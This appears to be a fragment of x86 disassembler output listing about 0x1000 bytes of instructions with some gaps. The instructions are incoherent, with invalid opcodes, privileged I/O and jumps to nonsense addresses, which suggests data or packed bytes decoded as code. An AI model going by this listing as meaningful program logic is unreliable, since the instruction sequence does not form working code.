  410e58:	shl    BYTE PTR [edi+ebp*4+0x335b97a0],cl
	...
  410e87:	add    BYTE PTR [ecx-0x6eccb069],bl
  410e8d:	xchg   edi,eax
  410e8e:	inc    ebx
  410e8f:	xor    eax,esi
  410e91:	push   esi
  410e92:	sbb    BYTE PTR ds:[ebx+esi*1],ch
  410e96:	popa   
  410e97:	xchg   ebp,eax
  410e98:	dec    edx
  410e99:	inc    ecx
  410e9a:	imul   esp,DWORD PTR [eax],0x44
  410e9d:	pop    ebx
  410e9e:	pushf  
  410e9f:	arpl   WORD PTR ds:[edi+0x4b],dx
  410ea3:	(bad)  
  410ea4:	fcomp  QWORD PTR [edx+0x16]
  410ea7:	sahf   
  410ea8:	sub    al,BYTE PTR [ecx+0x27]
  410eab:	or     BYTE PTR [eax+edx*8-0x58],ch
  410eaf:	add    ebx,DWORD PTR [ebx]
  410eb1:	inc    ecx
  410eb2:	call   FWORD PTR [ebp-0x72c4a926]
  410eb8:	pop    esp
  410eb9:	pop    ebx
  410eba:	out    dx,al
  410ebb:	popf   
  410ebc:	add    al,BYTE PTR [ecx-0x19]
  410ebf:	pop    ss
  410ec0:	lock xor ebp,edx
  410ec3:	lahf   
  410ec4:	repnz inc eax
  410ec6:	scas   eax,DWORD PTR es:[edi]
  410ec7:	inc    edi
  410ec8:	hlt    
  410ec9:	pop    edx
  410eca:	out    0x3,eax
  410ecc:	sbb    al,0xdc
  410ece:	add    al,0x70
  410ed0:	test   eax,0x4f9ce79a
  410ed5:	jb     0x410f41
  410ed7:	fistp  QWORD PTR [ebx-0x2f]
  410eda:	sub    BYTE PTR [ebx+eax*8],al
  410edd:	mov    edi,0x6e06f880
  410ee3:	inc    ebx
  410ee4:	sbb    al,0x40
  410ee6:	sbb    al,0xf5
  410ee8:	inc    ebx
  410ee9:	mov    edx,0x4451
	...
  410f12:	add    BYTE PTR [eax],al
  410f14:	add    BYTE PTR [esi+ecx*8],bl
  410f17:	sub    al,0xac
  410f19:	jmp    0x410f5a
  410f1b:	cmc    
  410f1c:	scas   eax,DWORD PTR es:[edi]
  410f1d:	xchg   edx,eax
  410f1e:	mov    BYTE PTR [eax],0xe5
  410f21:	test   al,0xc7
  410f23:	or     BYTE PTR [ecx+0x66fe4310],al
  410f29:	sbb    dl,BYTE PTR [bx+di]
  410f2c:	jmp    0x6b2de35b
  410f31:	push   esp
  410f32:	xor    al,0xfe
  410f34:	aam    0x17
  410f36:	xor    edi,DWORD PTR [edi]
  410f38:	pushf  
  410f39:	mov    eax,0xa2d96b41
  410f3e:	xchg   edi,eax
  410f3f:	lock cdq 
  410f41:	test   al,0xc7
  410f43:	or     BYTE PTR [ecx-0x18],al
  410f46:	lods   al,BYTE PTR ds:[esi]
  410f47:	std    
  410f48:	es and eax,0x66e5741b
  410f4e:	sbb    cl,BYTE PTR [ecx]
  410f50:	jmp    0xfca97a4a
  410f55:	sti    
  410f56:	cdq    
  410f57:	add    BYTE PTR [ebx+eiz*2+0x4b],dh
  410f5b:	push   ecx
  410f5c:	adc    DWORD PTR [edx],ebp
  410f5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f5f:	std    
  410f60:	not    BYTE PTR [ebx+ebx*1]
  410f63:	je     0x410f4a
  410f65:	(bad)  
  410f66:	sbb    DWORD PTR [ecx],ecx
  410f68:	jmp    0xe92da64d
  410f6d:	pop    ds
  410f6e:	pop    ebx
  410f6f:	add    BYTE PTR [edx+eiz*2+0x2f],ah
  410f73:	push   ecx
  410f74:	into   
  410f75:	or     dl,BYTE PTR [ebx-0x18]
  410f78:	mov    ch,0x0
	...
  410fa2:	adc    al,BYTE PTR [eax-0x2]
  410fa5:	repnz (bad) 
  410fa8:	push   es
  410fa9:	push   0x2a
  410fab:	das    
  410fac:	add    DWORD PTR [edx+ebx*1],esi
  410faf:	je     0x410f71
  410fb1:	mov    al,0xdd
  410fb3:	push   edi
  410fb4:	add    BYTE PTR [ecx],bh
  410fb6:	lds    edx,FWORD PTR [edx]
  410fb8:	jmp    0x5ee8:0x72376eec
  410fbf:	push   esp
  410fc0:	rol    BYTE PTR [eax],0x98
  410fc3:	out    0x55,al
  410fc5:	sbb    DWORD PTR [ebp+0x4d05735c],0x5c
  410fcc:	add    BYTE PTR [ecx],al
  410fce:	jne    0x410faa
  410fd0:	clc    
  410fd1:	add    DWORD PTR [ecx+0x55],ebx
  410fd4:	sub    eax,eax
  410fd6:	sub    al,0x1a
  410fd8:	push   es
  410fd9:	add    BYTE PTR [esi+0x75418bb7],dl
  410fdf:	rol    BYTE PTR [esp+ebp*8-0x4b],1
  410fe3:	fidiv  WORD PTR [eax+ecx*1-0x13]
  410fe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fe8:	push   esp
  410fe9:	call   DWORD PTR [edx]
  410feb:	fcomi  st,st(5)
  410fed:	add    DWORD PTR [ecx+0x47f88158],ecx
  410ff3:	push   0xef908306
  410ff8:	std    
  410ff9:	je     0x411036
  410ffb:	xor    bh,BYTE PTR [esi+0x53f7c9]
  411001:	(bad)  
  411002:	enter  0x4dee,0xff
	...
  41102e:	add    BYTE PTR [eax-0x576d17ae],cl
  411034:	(bad)  
  411036:	or     DWORD PTR ds:0x8605745d,0xffffffdf
  41103d:	push   DWORD PTR [ebx+edi*8-0x2b]
  411041:	jl     0x41102f
  411043:	cmc    
  411044:	imul   eax,DWORD PTR [esi],0x2b
  411047:	mov    ch,0x10
  411049:	ror    BYTE PTR [eax],0xc5
  41104c:	rol    DWORD PTR [esp+ebp*8+0x35],cl
  411050:	loop   0x4110c6
  411052:	or     ch,bl
  411054:	addr16 push ebx
  411056:	push   DWORD PTR [edx+0x4e]
  411059:	shl    BYTE PTR [ebp-0x35],0xd5
  41105d:	jl     0x41104b
  41105f:	lds    ebp,FWORD PTR [ebx+0x6]
  411062:	sub    ebx,DWORD PTR [esp+esi*8]
  411065:	retf   
  411066:	rcl    DWORD PTR [esp+esi*1],0x89
  41106a:	inc    esp
  41106b:	mov    BYTE PTR [ecx+ebx*4+0x74],ah
  41106f:	and    al,0xec
  411071:	xor    BYTE PTR [ebp-0x75],dl
  411074:	lds    eax,FWORD PTR [ebp+0x46dcf7]
  41107a:	cmp    ecx,0xffffffa7
  41107d:	add    al,0x75
  41107f:	sbb    ch,BYTE PTR [ecx-0x3c]
  411082:	enter  0x3c5e,0x2
  411086:	(bad)  
  411087:	fnstcw WORD PTR [edi+0x34]
  41108a:	call   ecx
  41108c:	dec    ebx
  41108d:	stos   BYTE PTR es:[edi],al
  41108e:	ss jmp 0xc3aa10
	...
  4110bc:	inc    esp
  4110bd:	push   esp
  4110be:	clts   
  4110c0:	lahf   
  4110c1:	out    dx,eax
  4110c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110c3:	push   DWORD PTR [eax+0x65bfef2d]
  4110c9:	jb     0x4110d7
  4110cb:	add    BYTE PTR [ecx+0x234fa5ef],bl
  4110d1:	out    0x9,eax
  4110d3:	call   0xfedbf00e
  4110d8:	lahf   
  4110d9:	pop    ebx
  4110da:	in     al,0x74
  4110dc:	and    dh,BYTE PTR [ecx-0x38e313e9]
  4110e2:	jmp    FWORD PTR [edx]
  4110e4:	fmul   QWORD PTR [edx]
  4110e6:	les    eax,FWORD PTR [edi]
  4110e8:	sbb    al,0xaf
  4110ea:	inc    eax
  4110eb:	in     al,dx
  4110ec:	dec    esp
  4110ed:	call   0x25aa:0x3c69fee4
  4110f4:	jno    0x41110b
  4110f6:	fwait
  4110f7:	mov    WORD PTR [ecx+0x10],ds
  4110fa:	xor    bh,bh
  4110fc:	push   ecx
  4110fd:	cmp    al,0xaa
  4110ff:	xchg   ebp,eax
  411100:	push   0xb4829aed
  411105:	pop    edx
  411106:	call   0xa01b3820
  41110b:	push   es
  41110c:	xor    edx,DWORD PTR [ebp+0x6a]
  41110f:	sbb    BYTE PTR [eax+0x4702145a],dh
  411115:	sbb    esi,DWORD PTR [ecx+0x4a5b1bc5]
  41111b:	imul   ebx,DWORD PTR [ecx+0x88e79b],0x0
	...
  411146:	add    BYTE PTR [eax],al
  411148:	add    al,bl
  41114a:	sbb    BYTE PTR cs:[esi],ch
  41114d:	inc    esp
  41114e:	fisttp QWORD PTR ds:[ebx]
  411151:	test   BYTE PTR [ebx-0x4c],cl
  411154:	call   0x5b23:0x581db26a
  41115b:	pop    esp
  41115c:	inc    eax
  41115d:	dec    eax
  41115e:	stos   BYTE PTR es:[edi],al
  41115f:	rol    DWORD PTR [ebx+edx*2],1
  411162:	(bad)  
  411163:	jmp    0x4110ff
  411165:	rcl    BYTE PTR [edx+0x3f],1
  411168:	daa    
  411169:	dec    edx
  41116a:	cmp    eax,0x525dcc2f
  41116f:	out    0x30,eax
  411171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411172:	imul   edi,DWORD PTR cs:[edi-0x685330d9],0xffffffd3
  41117a:	xor    dl,BYTE PTR [eax]
  41117c:	xor    ebx,DWORD PTR [ebx]
  41117e:	cmp    eax,0x3d101007
  411183:	jne    0x41118c
  411185:	hlt    
  411186:	das    
  411187:	call   0x2b0f:0x2751029a
  41118e:	cmp    al,0x5d
  411190:	or     al,0xf3
  411192:	(bad)  
  411193:	fld    TBYTE PTR [esi+eiz*1+0x1699d73d]
  41119a:	sbb    edx,DWORD PTR [ebp+0x4]
  41119d:	fcmovnb st,st(6)
  41119f:	ret    
  4111a0:	lods   al,BYTE PTR ds:[esi]
  4111a1:	int3   
  4111a2:	stos   DWORD PTR es:[edi],eax
  4111a3:	mov    esi,0x119d499
  4111a8:	in     eax,0x1f
  4111aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111ab:	mov    DWORD PTR [ebp+0x0],edi
	...
  4111d5:	add    BYTE PTR [ebp+0x51910cc7],dl
  4111db:	lahf   
  4111dc:	std    
  4111dd:	sahf   
  4111de:	sbb    DWORD PTR [ebx],ebx
  4111e0:	jne    0x4111ac
  4111e2:	test   bh,al
  4111e4:	adc    BYTE PTR [ecx],bh
  4111e6:	enter  0x5b93,0x86
  4111ea:	mov    ch,0x8c
  4111ec:	push   0x7be680
  4111f1:	jbe    0x411206
  4111f3:	arpl   bp,di
  4111f5:	hlt    
  4111f6:	mov    ecx,DWORD PTR [ebp+edi*8-0x76ccd824]
  4111fd:	imul   eax,DWORD PTR [ebp+0x2715e93d],0x6220fe3c
  411207:	push   0x30a09c00
  41120c:	imul   ebp,ecx,0xc1bf2c1f
  411212:	xchg   BYTE PTR [eax-0x386b16c1],bh
  411218:	or     al,0x93
  41121a:	xor    DWORD PTR ds:0xec77f174,edi
  411220:	std    
  411221:	push   ss
  411222:	test   DWORD PTR [eax+eax*1+0x68fdc4e9],esi
  411229:	or     edi,DWORD PTR [edx+ebx*4]
  41122c:	add    dh,bh
  41122e:	sbb    cl,BYTE PTR [edi+0x6a]
  411231:	shl    DWORD PTR [esi+eax*8+0x3d770108],cl
  411238:	(bad)  
  411239:	out    0x0,al
	...
  411263:	inc    edi
  411264:	pop    ebx
  411265:	add    dh,cl
  411267:	inc    ebp
  411268:	mov    ah,0xd7
  41126a:	dec    ebp
  41126b:	pop    edi
  41126c:	pop    ebx
  41126d:	std    
  41126e:	push   esp
  41126f:	and    al,0xb1
  411271:	sbb    al,0x0
  411273:	fimul  DWORD PTR [eax+ecx*1-0x18]
  411277:	aaa    
  411278:	jecxz  0x411278
  41127a:	call   FWORD PTR [ebp+0x57]
  41127d:	add    bh,ch
  41127f:	dec    ebx
  411280:	jo     0x411264
  411282:	fs add al,0x57
  411285:	std    
  411286:	jne    0x411241
  411288:	ins    DWORD PTR es:[edi],dx
  411289:	sbb    al,0xff
  41128b:	add    BYTE PTR [edi-0x18],cl
  41128e:	imul   ebp,DWORD PTR [edx-0x7a97011e],0x57
  411295:	in     eax,dx
  411296:	mov    esi,0x4162002d
  41129b:	jne    0x41127f
  41129d:	je     0x4112ab
  41129f:	pop    ds
  4112a0:	push   DWORD PTR ss:[ebp+0x6d]
  4112a4:	out    dx,eax
  4112a5:	push   ecx
  4112a6:	dec    edx
  4112a8:	loop   0x41130f
  4112aa:	add    BYTE PTR [ebp-0xe],dh
  4112ad:	mov    ebx,0x3f5be768
  4112b2:	add    dl,bl
  4112b4:	dec    esp
  4112b5:	or     al,0x6a
  4112b7:	push   ss
  4112b8:	loop   0x41132e
  4112ba:	or     ch,bl
  4112bc:	and    al,0xff
  4112be:	dec    DWORD PTR [edx]
  4112c0:	adc    eax,eax
  4112c2:	or     BYTE PTR [ebp+0x6c],al
  4112c5:	mov    esp,ebp
	...
  4112ef:	add    BYTE PTR [esi+0x356af9fb],dh
  4112f5:	ins    DWORD PTR es:[edi],dx
  4112f6:	xor    bh,bh
  4112f8:	mov    al,0x66
  4112fa:	call   0xff14c3cc
  4112ff:	mov    eax,eax
  411301:	shl    BYTE PTR [ebp+0x7a],cl
  411304:	nop
  411305:	popf   
  411306:	add    bh,bh
  411308:	jo     0x411370
  41130a:	call   0xff140d5c
  41130f:	call   DWORD PTR [eax-0x2d]
  411312:	(bad)  
  411313:	jne    0x411331
  411315:	cmp    al,0xaa
  411317:	div    DWORD PTR [ecx+0x29]
  41131a:	xchg   esi,eax
  41131b:	enter  0x48de,0x2
  41131f:	push   ebp
  411320:	xchg   edi,eax
  411321:	sub    BYTE PTR [edx+0x49ec0c3],al
  411327:	push   0xffffffef
  411329:	or     BYTE PTR [eax],dl
  41132b:	or     ah,al
  41132d:	loopne 0x41135e
  41132f:	jmp    FWORD PTR [ebx+0x34fc3fab]
  411335:	mov    ebx,0xe91c411f
  41133a:	invd   
  41133c:	test   BYTE PTR [eax-0x69],al
  41133f:	dec    BYTE PTR [ebx-0x7c03f047]
  411345:	aaa    
  411346:	or     ch,al
  411348:	arpl   WORD PTR [edi-0x6b],cx
  41134b:	(bad)  
  41134c:	xchg   BYTE PTR gs:[eax],al
  41134f:	add    cl,dl
  411351:	lods   al,BYTE PTR ds:[esi]
  411352:	test   al,0x82
	...
  41137c:	add    BYTE PTR [eax-0x74],bl
  41137f:	sub    al,BYTE PTR [eax]
  411381:	(bad)  
  411382:	dec    edi
  411383:	xchg   ebp,eax
  411384:	je     0x4113aa
  411386:	mov    WORD PTR [ecx],gs
  411388:	push   ebp
  411389:	dec    ebx
  41138a:	jns    0x411317
  41138c:	inc    esp
  41138d:	inc    eax
  41138e:	sbb    al,0x73
  411390:	fld    QWORD PTR fs:[ebx-0x69]
  411394:	je     0x4113ba
  411396:	dec    esp
  411397:	test   eax,0x2a592bfd
  41139c:	add    BYTE PTR [esp+edx*4-0x23e3bee1],dh
  4113a3:	jbe    0x411409
  4113a5:	pop    ebp
  4113a6:	inc    esp
  4113a7:	xchg   edi,eax
  4113a8:	xor    al,0xfd
  4113aa:	jmp    0x4113f0
  4113ac:	add    ah,dh
  4113ae:	daa    
  4113af:	cmp    edi,edi
  4113b1:	sti    
  4113b2:	cmp    al,0xc2
  4113b4:	jae    0x4113e9
  4113b6:	pop    ebx
  4113b7:	jo     0x4113f9
  4113b9:	in     al,0xc2
  4113bb:	loopne 0x411412
  4113bd:	and    ebx,DWORD PTR [ebx+0x3f]
  4113c0:	add    al,0x1c
  4113c2:	dec    edx
  4113c3:	mov    gs,WORD PTR [ebx]
  4113c5:	cmc    
  4113c6:	mov    esi,0xafcb0428
  4113cb:	mov    edi,0xbf634896
  4113d0:	sar    DWORD PTR [edx],1
  4113d2:	cmp    ch,BYTE PTR [edi+0x27f8b52b]
  4113d8:	add    al,0x34
  4113da:	pop    ebx
  4113db:	out    0xa6,eax
  4113dd:	popa   
  4113de:	ret    0x1f89
	...
  411409:	add    ch,bl
  41140b:	pop    edx
  41140c:	mov    ss,WORD PTR [eax]
  41140e:	xchg   esp,eax
  41140f:	cmp    ebp,edi
  411411:	or     esi,DWORD PTR [edx+edx*2-0x2]
  411415:	xchg   esi,eax
  411416:	cmp    BYTE PTR [ecx],0xfd
  411419:	fwait
  41141a:	and    DWORD PTR [ebx],0x17
  41141d:	xchg   edi,eax
  41141e:	jb     0x411459
  411420:	fst    QWORD PTR [edi-0x54105096]
  411426:	daa    
  411427:	nop
  411428:	push   esi
  411429:	xchg   esi,eax
  41142a:	fs sbb al,0xe4
  41142d:	add    ebp,ecx
  41142f:	in     eax,0x53
  411431:	sbb    BYTE PTR [edi+0x36],0xd2
  411435:	add    esi,DWORD PTR [esi+0x2410366f]
  41143b:	inc    ebx
  41143c:	dec    eax
  41143d:	das    
  41143e:	xor    edi,DWORD PTR [ecx]
  411440:	jno    0x411482
  411442:	sub    dl,al
  411444:	pop    esi
  411445:	and    ch,bl
  411447:	pop    edx
  411448:	push   ss
  411449:	adc    BYTE PTR [ebx+eax*2],ah
  41144c:	mov    BYTE PTR [ebp+0x10073912],dl
  411452:	or     BYTE PTR [ecx],bh
  411454:	jne    0x411461
  411456:	hlt    
  411457:	add    BYTE PTR fs:[edx+edx*4-0xcd437c7],bl
  41145f:	cmp    BYTE PTR [ebp+0x72],dl
  411462:	mov    ah,0xdd
  411464:	(bad)  
  411465:	fnsave [esi]
  411467:	pop    ebx
  411468:	push   0x1f
  41146a:	mov    cl,0xaf
  41146c:	or     cl,al
	...
  411496:	add    BYTE PTR [ecx],bh
  411498:	mov    ebp,?
  41149a:	(bad)  
  41149b:	xchg   edi,eax
  41149c:	lahf   
  41149d:	cld    
  41149e:	push   ecx
  41149f:	sar    BYTE PTR [edi-0x506f16c1],1
  4114a5:	or     cl,al
  4114a7:	mov    ecx,0x91a6fe36
  4114ac:	scas   eax,DWORD PTR es:[edi]
  4114ad:	cld    
  4114ae:	sahf   
  4114af:	adc    esp,DWORD PTR [ebx-0x18]
  4114b2:	mov    bl,0x4c
  4114b4:	cmp    dh,bh
  4114b6:	mov    al,ds:0x1c005c5e
  4114bb:	xchg   ebp,eax
  4114bc:	inc    esp
  4114bd:	and    BYTE PTR [ebp+0x300c2a4],0x69
  4114c4:	cmp    DWORD PTR [ecx+eiz*8-0x39],esi
  4114c8:	mov    dh,0x54
  4114ca:	xchg   cx,ax
  4114cc:	jecxz  0x411511
  4114ce:	pop    ebp
  4114cf:	xor    BYTE PTR ds:0x381fa864,cl
  4114d5:	je     0x4114b8
  4114d7:	xchg   DWORD PTR [esi],esi
  4114d9:	cld    
  4114da:	inc    esi
  4114db:	mov    cl,0x39
  4114dd:	je     0x41151c
  4114df:	test   eax,0xc74108af
  4114e4:	mov    edi,ebp
  4114e6:	sbb    al,BYTE PTR cs:[di]
  4114ea:	jmp    0x6b2df8e9
  4114ef:	pop    esp
  4114f0:	xor    al,0x6b
  4114f2:	jmp    0x953e883c
  4114f7:	daa    
  4114f8:	inc    ebx
  4114f9:	dec    esp
	...
  411522:	add    BYTE PTR [eax],al
  411524:	test   eax,0xb889fece
  411529:	iret   
  41152a:	fisubr DWORD PTR gs:[eax+0x68ff009c]
  411531:	fs call 0xff101604
  411537:	dec    DWORD PTR [eax-0x2d]
  41153a:	(bad)  
  41153b:	jne    0x4114fa
  41153d:	add    esi,DWORD PTR [esi+0x54]
  411540:	loop   0x411510
  411542:	enter  0xb9c2,0x5b
  411546:	push   ebx
  411547:	mov    edx,ecx
  411549:	into   
  41154a:	je     0x411558
  41154c:	fstp   QWORD PTR [edx+0x6282ff59]
  411552:	shl    BYTE PTR [eax+eiz*1-0x79],0xeb
  411557:	gs hlt 
  411559:	pop    esi
  41155a:	push   eax
  41155b:	call   0x3e8722
  411560:	push   ebp
  411561:	into   
  411562:	je     0x411574
  411564:	and    eax,0xad0874ce
  411569:	inc    ecx
  41156a:	xlat   BYTE PTR ds:[ebx]
  41156b:	push   edx
  41156d:	add    ecx,eax
  41156f:	push   esi
  411570:	add    cl,bh
  411572:	enter  0x71c2,0x5b
  411576:	push   ebx
  411577:	mov    edx,ecx
  411579:	fcmovb st,st(1)
  41157b:	clc    
  41157c:	call   0x74ce:0x2c6a0081
  411583:	or     ch,ch
  411585:	add    dl,BYTE PTR [ebx-0x1]
	...
  4115b0:	add    BYTE PTR [edx],al
  4115b2:	in     eax,0x44
  4115b4:	cld    
  4115b5:	mov    esi,0x84486510
  4115ba:	pop    ebx
  4115bb:	cmp    BYTE PTR [edi],0x35
  4115be:	addr16 jl 0x411629
  4115c1:	sbb    DWORD PTR [ecx+0x3f],ebx
  4115c4:	add    BYTE PTR [esi*8+0x445f0da9],bl
  4115cb:	add    cl,BYTE PTR [ebx]
  4115cd:	fdivr  QWORD PTR [eax-0x1d0ba8cc]
  4115d3:	and    edi,edi
  4115d5:	sti    
  4115d6:	cmp    edx,eax
  4115d8:	jae    0x411623
  4115da:	mov    ebx,0x97ebf83e
  4115df:	mov    WORD PTR [ecx+0x6],gs
  4115e2:	adc    eax,0xc6c40818
  4115e7:	xchg   ecx,eax
  4115e8:	(bad)  
  4115e9:	shl    DWORD PTR ds:0x4036f818,cl
  4115ef:	xchg   ebx,eax
  4115f0:	je     0x411606
  4115f2:	or     al,0xc
  4115f4:	(bad)  
  4115f5:	mov    ebx,0xb47491ed
  4115fa:	call   0x6b9a:0x2c31fee5
  411601:	mov    ds:0x936791d5,eax
  411606:	addr16 inc ebx
  411608:	add    BYTE PTR [ebx-0x6f1873b1],dl
  41160e:	jnp    0x4115a1
  411610:	(bad)  
  411611:	pop    ss
  411612:	add    al,0x19
  411614:	adc    al,BYTE PTR [eax]
	...
  41163e:	int3   
  41163f:	lods   al,BYTE PTR ds:[esi]
  411640:	pop    ss
  411641:	clc    
  411642:	int3   
  411643:	les    edx,FWORD PTR [edi]
  411645:	or     BYTE PTR [ebp+ebx*8-0x46],dh
  411649:	(bad)  
  41164a:	arpl   WORD PTR [ecx+edx*8-0x6e72a4ab],cx
  411651:	je     0x4116a7
  411653:	pushf  
  411654:	fst    DWORD PTR [ebp+0x4b]
  411657:	popf   
  411658:	nop
  411659:	xor    bl,BYTE PTR [ebx+ebx*8-0x6f]
  41165d:	(bad)  
  41165e:	cmp    ebp,DWORD PTR [ebp-0x6a]
  411661:	lods   eax,DWORD PTR ds:[esi]
  411662:	hlt    
  411663:	cmp    al,0x19
  411665:	test   BYTE PTR [ebx],ch
  411667:	pop    ebx
  411668:	pushf  
  411669:	(bad)  
  41166a:	and    dh,BYTE PTR [eax-0x76486411]
  411670:	push   ss
  411671:	xchg   ebx,eax
  411672:	jb     0x411698
  411674:	sub    cl,BYTE PTR [eax]
  411676:	sbb    al,0x90
  411678:	jb     0x41161a
  41167a:	add    dh,BYTE PTR [eax-0x6e7e6415]
  411680:	not    BYTE PTR [edx-0xf8be4da]
  411686:	sbb    DWORD PTR [ebp+0x4d],0x45
  41168a:	sbb    al,0x8b
  41168c:	iret   
  41168d:	xchg   ebp,eax
  41168e:	je     0x4116c6
  411690:	xlat   BYTE PTR ds:[ebx]
  411691:	xor    edx,ebx
  411693:	scas   eax,DWORD PTR es:[edi]
  411694:	div    DWORD PTR [ebx]
  411696:	retf   
  411697:	scas   eax,DWORD PTR es:[edi]
  411698:	out    dx,eax
  411699:	fwait
  41169a:	push   eax
  41169b:	or     eax,0x47c392bf
  4116a0:	sbb    eax,0x93
	...
  4116c9:	add    BYTE PTR [eax],al
  4116cb:	mov    dl,0x23
  4116cd:	stos   BYTE PTR es:[edi],al
  4116ce:	jmp    FWORD PTR [ebx-0x61608d72]
  4116d4:	push   ds
  4116d5:	mov    al,ds:0x15b063a
  4116da:	into   
  4116db:	xchg   edx,eax
  4116dc:	scas   eax,DWORD PTR es:[edi]
  4116dd:	fistp  WORD PTR [ebx-0x6d7975e7]
  4116e3:	xchg   esp,eax
  4116e4:	lahf   
  4116e5:	jnp    0x411765
  4116e7:	cmp    al,al
  4116e9:	pop    ds
  4116ea:	inc    ebp
  4116eb:	sbb    al,0xdb
  4116ed:	scas   al,BYTE PTR es:[edi]
  4116ee:	add    esi,eax
  4116f0:	xchg   ebx,eax
  4116f1:	iret   
  4116f2:	add    al,0xfa
  4116f4:	fwait
  4116f5:	out    0x3a,eax
  4116f7:	inc    esp
  4116f8:	imul   ebp,DWORD PTR [ecx+0x27621c03],0x17
  4116ff:	or     BYTE PTR [esi+0x35e2884f],cl
  411705:	aas    
  411706:	(bad)  
  411707:	jnp    0x4116b7
  411709:	add    bl,bh
  41170b:	mov    al,0x9e
  41170d:	clc    
  41170e:	cs add al,0x33
  411711:	imul   eax,DWORD PTR [ebx],0xffffff8f
  411714:	scas   al,BYTE PTR es:[edi]
  411715:	or     BYTE PTR [ecx],dl
  411717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411718:	xor    eax,0xafae16fe
  41171d:	clc    
  41171e:	cmp    ebx,0x35
  411721:	je     0x411714
  411723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411724:	mov    bl,0xfd
  411726:	dec    BYTE PTR [ebp+0x10f17435]
  41172c:	js     0x41172b
  41172e:	je     0x411730
	...
  411758:	out    0x3c,eax
  41175a:	ins    DWORD PTR es:[edi],dx
  41175b:	out    0x8d,al
  41175d:	xor    eax,0x3ca854fe
  411762:	jl     0x4117a0
  411764:	lods   eax,DWORD PTR ds:[esi]
  411765:	xor    eax,0xf3e01afd
  41176a:	std    
  41176b:	(bad)  
  41176c:	lods   eax,DWORD PTR ds:[esi]
  41176d:	xor    eax,0x5de88ff3
  411772:	jae    0x411702
  411774:	lea    ebp,[edi+0x6313aefc]
  41177a:	call   0xfe75020a
  41177f:	xlat   BYTE PTR ds:[ebx]
  411781:	sbb    al,BYTE PTR ds:0xece04ae9
  411787:	push   0x54
  411789:	xor    BYTE PTR [esi+0x13],dl
  41178c:	sbb    cl,al
  41178e:	cmp    DWORD PTR [esi+0x13],edi
  411791:	arpl   ax,bp
  411793:	ins    DWORD PTR es:[edi],dx
  411794:	sub    dh,BYTE PTR [esi+edi*8]
  411797:	pusha  
  411798:	jecxz  0x4117d0
  41179a:	mov    ah,BYTE PTR [ebx+edi*1]
  41179d:	mov    ds:0x759fe93f,eax
  4117a2:	add    ch,bl
  4117a4:	ffreep st(2)
  4117a6:	(bad)  
  4117a8:	ficomp WORD PTR [edx+0x55]
  4117ab:	add    ch,ch
  4117ad:	rol    DWORD PTR [eax+0x0],0x45
  4117b1:	aaa    
  4117b2:	mov    esi,0xe8722674
  4117b7:	sti    
  4117b8:	fwait
  4117b9:	retf   
  4117ba:	dec    BYTE PTR [ebx]
	...
  4117e4:	add    ch,dh
  4117e6:	push   edx
  4117e7:	pop    ss
  4117e8:	push   eax
  4117e9:	lods   eax,DWORD PTR ds:[esi]
  4117ea:	push   edi
  4117eb:	add    bh,ch
  4117ed:	imul   edx,DWORD PTR [edi+0x19],0x66
  4117f1:	mov    ah,0x57
  4117f3:	push   eax
  4117f4:	inc    DWORD PTR [eax+0x7b03e630]
  4117fa:	retf   
  4117fb:	(bad)  
  4117fc:	call   0x3e84fa
  411801:	stc    
  411802:	push   cs
  411803:	mov    esi,0xfecafab9
  411808:	push   edi
  41180a:	mov    ecx,0x1f700735
  41180f:	push   DWORD PTR [ebp-0x27]
  411812:	retf   0x874
  411815:	in     eax,dx
  411816:	dec    eax
  411817:	push   edx
  411818:	(bad)  
  411819:	jp     0x411885
  41181b:	mov    edx,0x8b5357c1
  411821:	imul   ebx,esi,0x2536e8c1
  411827:	jae    0x411874
  411829:	inc    esp
  41182a:	pop    edi
  41182b:	add    BYTE PTR [ebp-0x7f],dh
  41182e:	lock mov edi,0x55750c
  411834:	push   0x75
  411836:	push   ebp
  411837:	std    
  411838:	push   DWORD PTR [eax+0x33]
  41183b:	push   0xe85f1f00
  411840:	xchg   ebp,eax
  411841:	xor    eax,0xb089005f
  411846:	(bad)  
  411848:	jne    0x41184a
	...
  411872:	mov    ebp,0x1c54d4cf
  411877:	lea    edx,[eax-0x6f5a1e78]
  41187d:	je     0x4118c3
  41187f:	pushf  
  411880:	push   ss
  411881:	cld    
  411882:	(bad)  
  411883:	je     0x411815
  411885:	je     0x4118a7
  411887:	sbb    BYTE PTR [edx],al
  411889:	push   0x1c
  41188b:	call   0x447f:0x421c4014
  411892:	adc    ch,dh
  411894:	sbb    eax,DWORD PTR [eax]
  411896:	xchg   BYTE PTR [esp+ebx*1+0x12],al
  41189a:	jbe    0x4118e0
  41189c:	xchg   ecx,eax
  41189d:	je     0x41189f
  41189f:	pop    edx
  4118a0:	div    BYTE PTR [edx+0x67]
  4118a3:	add    eax,DWORD PTR [edx]
  4118a5:	test   esp,ebx
  4118a7:	cmp    DWORD PTR [edx-0x79],edi
  4118aa:	sbb    al,0x44
  4118ac:	add    cl,BYTE PTR [ebx+0x117a1049]
  4118b2:	test   eax,0x464f9477
  4118b7:	inc    esp
  4118b8:	sbb    BYTE PTR [edx],dl
  4118ba:	ss inc esp
  4118bc:	sbb    al,BYTE PTR [eax+0x3a]
  4118bf:	add    DWORD PTR [edi+edi*8],0x31
  4118c3:	call   0xbf4d6a55
  4118c8:	les    esi,FWORD PTR [edi+0x4b]
  4118cb:	add    DWORD PTR [eax],ebx
  4118cd:	lock mov ah,0x84
  4118d0:	inc    eax
  4118d1:	call   FWORD PTR [ebx+0xe847ab]
	...
  4118ff:	daa    
  411900:	add    al,0x19
  411902:	dec    eax
  411903:	mov    eax,DWORD PTR [edi-0x64]
  411906:	out    0xf0,eax
  411908:	dec    edi
  411909:	(bad)  
  41190a:	(bad)  
  41190b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41190c:	ja     0x4118ae
  41190e:	(bad)  
  41190f:	jmp    0xda93b5c7
  411914:	ror    BYTE PTR [ebp+0x4f5ae9fe],0x8f
  41191b:	sar    BYTE PTR [esi],1
  41191d:	pop    edi
  41191e:	sbb    DWORD PTR [ebx+eax*2+0x2d],ecx
  411922:	inc    eax
  411923:	dec    ebx
